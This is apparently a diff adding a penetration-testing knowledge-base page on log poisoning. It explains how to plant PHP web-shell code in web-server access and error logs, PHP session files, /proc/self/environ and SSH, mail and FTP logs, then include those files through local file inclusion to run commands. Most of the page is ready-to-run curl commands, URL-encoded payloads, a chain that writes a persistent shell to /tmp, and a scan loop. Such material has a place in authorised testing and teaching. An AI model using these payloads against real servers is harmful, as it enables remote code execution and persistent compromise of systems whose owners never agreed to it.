@@ -1,0 +1,398 @@
+---
+title: Log poisoning
+description: Writing PHP code into server logs (User-Agent, error logs, SSH/FTP/mail logs) and PHP session files, then including those logs via LFI for RCE.
+mitre: [T1190, T1059, T1027]
+d3fend: [D3-EAL, D3-FA]
+impact: [ServerSideEval, RCE]
+owasp: [A03]
+sidebar:
+  order: 8
+  label: Log poisoning
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Get attacker-controlled data into a server-side log file, then include the log via LFI. The PHP code in the log entry executes when included.
+
+```
+# Poison Apache/Nginx access log via User-Agent header
+curl -A '<?php system($_GET["cmd"]); ?>' https://target/
+
+# Include the log
+?page=/var/log/nginx/access.log&cmd=id
+
+# Poison PHP session - set the session value to PHP code
+?page=<?php system($_GET["cmd"]); ?>          # value goes into the session file
+?page=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id   # then include the session
+
+# Other log sources
+?page=/var/log/auth.log&cmd=id                # SSH attempts log User-Agent-equivalents
+?page=/var/log/mail.log&cmd=id                # mail server can be poisoned via crafted emails
+?page=/var/log/vsftpd.log&cmd=id              # FTP login attempts
+?page=/proc/self/environ&cmd=id               # environment variables - Linux /proc
+```
+
+Success indicator: command output in the response after including the poisoned log.
+
+## When this is the right approach
+
+Log poisoning is the fallback when:
+
+- **Wrappers are blocked** - `data://`, `php://input` filtered or `allow_url_include = Off`
+- **No upload feature** - can't use the [file-upload chain](/codex/web/lfi/file-upload-chain/)
+- **`expect://` not installed**
+- **Outbound network blocked** - can't [RFI](/codex/web/lfi/rfi/)
+
+What you need:
+
+1. LFI that **executes** included files
+2. A log or session file that **records something you control**
+3. **Read access to that log** via the LFI
+
+The third requirement is the often-overlooked gate. Apache logs are root-readable; Nginx logs are usually `www-data`-readable. Check before committing.
+
+## Pattern 1 - Apache / Nginx access log
+
+The access log records HTTP requests with several attacker-controllable fields. The `User-Agent` is the cleanest:
+
+```
+192.168.1.10 - - [11/May/2026:20:00:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "<USER_AGENT>"
+                                                                              └─── attacker control ───┘
+```
+
+### Step 1 - Identify the log path
+
+Common paths:
+
+```
+# Apache
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/httpd/access_log              # RHEL/CentOS
+/var/log/httpd/error_log
+
+# Nginx
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+
+# Custom / framework-specific
+/var/log/<appname>/access.log
+/opt/<appname>/logs/access.log
+```
+
+When unknown, read the web server config to find the log directive:
+
+```
+?page=php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf
+?page=php://filter/convert.base64-encode/resource=/etc/nginx/nginx.conf
+```
+
+Look for `CustomLog`, `ErrorLog`, `access_log`, `error_log` directives.
+
+### Step 2 - Confirm read access
+
+```
+?page=/var/log/nginx/access.log
+```
+
+If you see log content, read access works. If you see an error or empty response, read is blocked - most often because Apache logs are restricted to `root`/`adm`.
+
+### Step 3 - Poison the log
+
+Set the `User-Agent` to PHP code in any request to the target:
+
+```bash
+curl -A '<?php system($_GET["cmd"]); ?>' https://target/
+```
+
+The access log now contains:
+
+```
+192.168.1.10 - - [11/May/2026:20:00:30 +0000] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET[\"cmd\"]); ?>"
+```
+
+### Step 4 - Include and execute
+
+```
+?page=/var/log/nginx/access.log&cmd=id
+```
+
+PHP parses the entire log file looking for `<?php ... ?>` blocks. When it hits the poisoned line, it executes `system($_GET["cmd"])` with `cmd=id`. The output appears in the response.
+
+Result:
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Caveats
+
+- **Log size.** Production access logs are huge. Including a 200MB log via LFI is slow and may time out or crash the server. Mitigate by testing on lab apps with small logs; in production, log poisoning is a known-loud and known-fragile path.
+- **Quote escaping.** Some log formats HTML-escape the User-Agent before writing. `<` becomes `&lt;`, breaking PHP parsing. Test the log entry after one poisoning request and verify the `<?php` is unencoded.
+- **Multi-request escalation.** Each command requires the log to contain the poisoning payload at execution time. The log accumulates - your first poisoning persists, so subsequent commands just re-include the log with a different `cmd=`.
+
+## Pattern 2 - Error log
+
+Same as access log but writes when requests fail:
+
+```
+?page=/var/log/nginx/error.log
+```
+
+Error logs are sometimes more readable than access logs (different default permissions) and frequently smaller. To poison:
+
+```bash
+# Force an error containing your User-Agent or other controllable field
+curl -A '<?php system($_GET["cmd"]); ?>' https://target/nonexistent-path
+```
+
+The 404 generates an error log entry containing the User-Agent. Same inclusion pattern as access log.
+
+### Specific error-log poisoning vectors
+
+Beyond User-Agent, error logs sometimes record:
+
+- **Referer header** - when a referrer-based check fails
+- **Request URI** - when a path with special characters causes a parse error
+- **Authentication failures** - username from Basic Auth attempts:
+
+```bash
+# The Authorization header reveals the username on auth failure
+curl -u '<?php system($_GET["cmd"]); ?>:anything' https://target/protected
+```
+
+The error log records: `user 'shellpayload' authentication failure for /protected`.
+
+## Pattern 3 - PHP session file
+
+PHP stores session data in files on disk, named after the `PHPSESSID` cookie:
+
+```
+/var/lib/php/sessions/sess_<PHPSESSID>           # Linux default
+C:\Windows\Temp\sess_<PHPSESSID>                  # Windows default
+```
+
+The file contents are a serialized PHP structure with whatever session variables the application set. If the application sets a session value from user input, you can poison the session.
+
+### Step 1 - Find the session file path
+
+The `PHPSESSID` cookie in your browser tells you the filename:
+
+```
+Cookie: PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
+                  ↓
+       /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+### Step 2 - Identify a session-stored field
+
+Include the session file and see what's in it:
+
+```
+?page=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+A typical output:
+
+```
+page|s:6:"es.php";preference|s:7:"english";
+```
+
+Each `name|s:N:"value";` is a session variable. The `name` is set by the application; the `value` came from somewhere.
+
+Determine which session variables you can control. Common candidates:
+
+- **Last visited page** (often the `?page=` parameter itself - a perfect self-poisoning loop)
+- **Language preference**
+- **Theme**
+- **Search query**
+- **Recently viewed items**
+
+### Step 3 - Poison the session
+
+Set the controlled value to PHP code. If the `page` value is stored in the session:
+
+```bash
+curl 'https://target/?page=<?php system($_GET["cmd"]); ?>' \
+     -b 'PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd'
+```
+
+URL-encoded:
+
+```bash
+curl 'https://target/?page=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E' \
+     -b 'PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd'
+```
+
+Now the session file contains:
+
+```
+page|s:30:"<?php system($_GET["cmd"]); ?>";preference|s:7:"english";
+```
+
+### Step 4 - Include the session
+
+```
+?page=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+PHP parses the file, hits the `<?php ... ?>` block inside the session value, executes.
+
+### Caveats
+
+- **The session file is overwritten on every request.** When you include the session via LFI, the application processes your request normally - which updates the session, replacing the poisoned `page` value with `/var/lib/php/sessions/sess_xxx`. Subsequent inclusions see the LFI path inside the session value, not your shell.
+
+  Mitigation: re-poison before each include. Or chain to a persistent shell:
+
+  ```bash
+  # Use the first execution to write a permanent shell
+  curl 'https://target/?page=%3C%3Fphp%20file_put_contents%28%22%2Ftmp%2Fx%22%2C%22%3C%3Fphp%20system%28%5C%24_GET%5B%5C%22c%5C%22%5D%29%3B%20%3F%3E%22%29%3B%20%3F%3E' \
+       -b 'PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd'
+
+  # Now include /tmp/x for all future commands (no re-poisoning needed)
+  curl 'https://target/?page=/tmp/x&c=id'
+  ```
+
+- **Session permissions.** PHP session files are typically owned by `www-data` with `600` permissions - accessible to the web app itself (which the LFI runs in) but not the operator directly. The LFI's read access is what makes inclusion possible.
+
+## Pattern 4 - `/proc/self/environ` (Linux)
+
+Linux exposes process environment variables via `/proc/<pid>/environ`. The current process is accessible as `/proc/self/environ`:
+
+```
+?page=/proc/self/environ
+```
+
+The file's content is a null-separated list of environment variables - including `HTTP_USER_AGENT`, which the web server set from your request:
+
+```
+USER=www-data\0HTTP_USER_AGENT=<?php system($_GET["cmd"]); ?>\0PATH=/usr/bin:/bin\0...
+```
+
+Poison by setting User-Agent in a single request and including `/proc/self/environ` in the same request (or the next):
+
+```bash
+curl -A '<?php system($_GET["cmd"]); ?>' \
+     'https://target/?page=/proc/self/environ&cmd=id'
+```
+
+### Caveats
+
+- **Linux only** - `/proc` is Linux-specific. Windows targets don't have this file.
+- **Permission restrictions** - `/proc/self/environ` is readable to the process owner. The web app reads its own environ fine. But under PHP-FPM or with `open_basedir` restrictions, the read may fail.
+- **PID variability** - `/proc/self/` always points to the current process. `/proc/<NUMBER>/environ` for other processes works if accessible, but the PID varies.
+
+## Pattern 5 - SSH log
+
+When `sshd` logs login attempts, the attempted *username* is recorded. A malformed username containing PHP poisons the log:
+
+```bash
+# Attempt SSH login with PHP as the username
+ssh '<?php system($_GET["cmd"]); ?>'@target.example.com
+# Type any password; it fails; the username is logged
+```
+
+The auth log records:
+
+```
+May 11 20:00:30 target sshd[1234]: Failed password for invalid user <?php system($_GET["cmd"]); ?> from 192.168.1.10 port 5555 ssh2
+```
+
+Include:
+
+```
+?page=/var/log/auth.log&cmd=id
+```
+
+### Caveats
+
+- **`/var/log/auth.log` is usually root-readable only.** LFI as `www-data` typically can't read it. Check before relying on this.
+- **Shell quoting.** The SSH client may reject usernames with `<`, `>`, `?`, and shell metacharacters. Quote carefully or escape via base64 + decode wrapper:
+
+  ```bash
+  ssh "$(echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ | base64 -d)"@target
+  ```
+
+  (The base64 trick doesn't actually help here because the shell-quoting issue is in the SSH client's username field, not the bash command. Direct quoting with single quotes usually works.)
+
+## Pattern 6 - Mail log
+
+When the application sends emails (registration confirmation, password reset), the mail logs record sender/recipient addresses:
+
+```
+?page=/var/log/mail.log
+```
+
+Poisoning: trigger a feature that emails to an attacker-supplied address, set the address to PHP code:
+
+```
+attacker.com<?php system($_GET["cmd"]); ?>
+```
+
+Most mail systems will reject this as malformed - but the *attempt* may still be logged before rejection.
+
+### Caveats
+
+- Highly variable based on mail configuration. Some logs contain the malformed address; others sanitize. Test.
+- `/var/log/mail.log` is also typically root-readable. The LFI-as-`www-data` reach is limited.
+
+## Pattern 7 - FTP log
+
+If the target runs an FTP service (vsftpd, ProFTPD), login attempts are logged with the attempted username:
+
+```
+?page=/var/log/vsftpd.log
+```
+
+Poison via attempted FTP login with PHP as the username. Similar to SSH log poisoning, the log file's read permissions are the gating factor.
+
+## Combining patterns
+
+A real engagement chains: confirm LFI, identify which logs/sessions are readable, poison the most accessible one, include.
+
+```bash
+# 1. Confirm LFI
+curl 'https://target/?page=/etc/passwd'
+
+# 2. Check log readability
+for log in /var/log/nginx/access.log /var/log/apache2/access.log /var/log/auth.log /proc/self/environ; do
+    response=$(curl -s "https://target/?page=$log")
+    if [ -n "$response" ]; then
+        echo "[+] Readable: $log"
+    fi
+done
+
+# 3. Poison the readable log via the cheapest channel
+curl -A '<?php system($_GET["cmd"]); ?>' https://target/
+
+# 4. Include
+curl "https://target/?page=/var/log/nginx/access.log&cmd=id"
+```
+
+## Detection-only payloads
+
+Confirm log inclusion works without committing to a poisoning attack:
+
+```bash
+# Just include a log and verify it has content
+curl "https://target/?page=/var/log/nginx/access.log" | head -c 500
+
+# Confirm User-Agent appears in the log
+curl -A "MY_UNIQUE_PROBE_$(date +%s)" https://target/
+sleep 1
+curl "https://target/?page=/var/log/nginx/access.log" | grep MY_UNIQUE_PROBE
+```
+
+If the probe string appears in the log inclusion response, poisoning is technically feasible - though execution still depends on the LFI sink executing PHP.
+
+## Notes
+
+- **Log poisoning is loud.** Each poisoning attempt writes to logs that defenders monitor. Successful exploitation leaves a clear trace. Unlike wrapper-based RCE, this attack is *guaranteed* to generate audit-log entries - both the poisoning request and the inclusion.
+- **The log might be rotated.** When you include the log to execute the poisoned payload, the log might already have rotated (`access.log.1`, `access.log.gz`). Include the rotated version, or re-poison and include immediately.
+- **Pre-existing log entries may also contain executable content.** If a previous tester or operator poisoned the log and didn't clean up, the log might already contain `<?php ... ?>` blocks. An LFI inclusion of the log "just works" without explicit poisoning. Worth checking before assuming the log needs poisoning.
+- **`open_basedir` may block `/var/log/` access.** Even when the log is technically readable to `www-data`, a PHP-side `open_basedir = /var/www` restriction prevents PHP from reading outside that tree. Check the PHP config first.
+
+<Aside type="caution">
+Log poisoning generates the most audit-log evidence of any LFI exploitation path. The poisoning entry and the inclusion entry both name the attacker IP. This is one of the loudest forms of LFI exploitation - only use when other paths are unavailable or when the engagement scope explicitly tolerates noise.
+</Aside>
